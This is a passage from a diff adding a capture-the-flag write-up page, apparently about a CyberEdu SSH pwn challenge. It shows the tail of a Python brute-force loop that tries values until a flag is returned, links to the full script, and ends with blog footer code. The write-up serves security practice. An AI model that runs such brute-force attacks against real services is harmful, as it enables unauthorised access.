+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">pass</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    cli<span style="color:#f92672">.</span>close()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> v17 <span style="color:#f92672">%</span> <span style="color:#ae81ff">256</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;tried </span><span style="color:#e6db74">{</span>hex(v17)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span></code></pre></div><p>So the second time I used caffeine and we get the flag! Took about half an hour or so.</p>
+<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/aptssh-writeup/pic12.png#center"></p>
+<p>To be completely honest, there might&rsquo;ve been a way to actually <em>find out</em> <code>v17</code>&rsquo;s value, but if it works it works right?</p>
+<hr>
+<p>As always, the full code can be found on my GitHub
+<strong><a href="https://github.com/irinasusca/ctf-writeups/blob/main/cyberedu/aptssh.py">here</a></strong>.</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://irinasusca.github.io/writeup-blog/tags/cyberedu/">CyberEdu</a></li>
+      <li><a href="https://irinasusca.github.io/writeup-blog/tags/pwn/">Pwn</a></li>
+      <li><a href="https://irinasusca.github.io/writeup-blog/tags/reverse-engineering/">Reverse-Engineering</a></li>
+      <li><a href="https://irinasusca.github.io/writeup-blog/tags/ssh/">Ssh</a></li>
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="https://irinasusca.github.io/writeup-blog/">Irina&#39;s CTF Writeups</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
